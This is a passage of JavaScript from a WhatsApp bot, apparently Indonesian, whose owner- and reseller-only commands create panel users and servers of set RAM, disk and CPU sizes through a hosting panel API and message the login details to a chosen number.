let egg = "15"
let loc = "1"
let memo = "2150"
let cpu = "50"
let disk = "2150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '2gb-v2': {
if (!isOwner && !isReseller2) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2150"
let cpu = "50"
let disk = "2150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain2}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '3gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3150"
let cpu = "60"
let disk = "3150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '3gb-v2': {
if (!isOwner && !isReseller2) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3150"
let cpu = "60"
let disk = "3150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain2}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '4gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4150"
let cpu = "80"
let disk = "4150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '4gb-v2': {
if (!isOwner && !isReseller2) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4150"
let cpu = "80"
let disk = "4150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain2}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '5gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5150"
let cpu = "90"
let disk = "5150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES  CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '5gb-v2': {
if (!isOwner && !isReseller2) return onlyOr()
let t = text.split('-');
if (t.length < 2) return m.reply(`Contoh: ${prefix+command} username-nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5150"
let cpu = "90"
let disk = "5150"
let email = username + "@gmail.com"

if (!u) return
let d = (await rafatharcode.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*BERIKUT DATA PANEL ANDA* `+readmore+`

• Username: ${user.username}
• Password: ${password.toString()}
• Server: ${ownername}

Simpan data panelmu baik-baik`
let msg = generateWAMessageFromContent(u, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LOGIN","url":"${domain2}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY UN",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PW",
"copy_code": `${password.toString()}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `${wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await rafatharcode.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`${monospace("SUKSES CPANEL")}

ID User : ${user.id}
ID Server : ${server.id}
Ram ${memo}
Disk ${disk}
Cpu ${cpu}%

Username dan password telah dikirim
ke nomer target`)

}
break

case '6gb': {
if (!isOwner && !isReseller) return onlyOr()
let t = text.split('-');
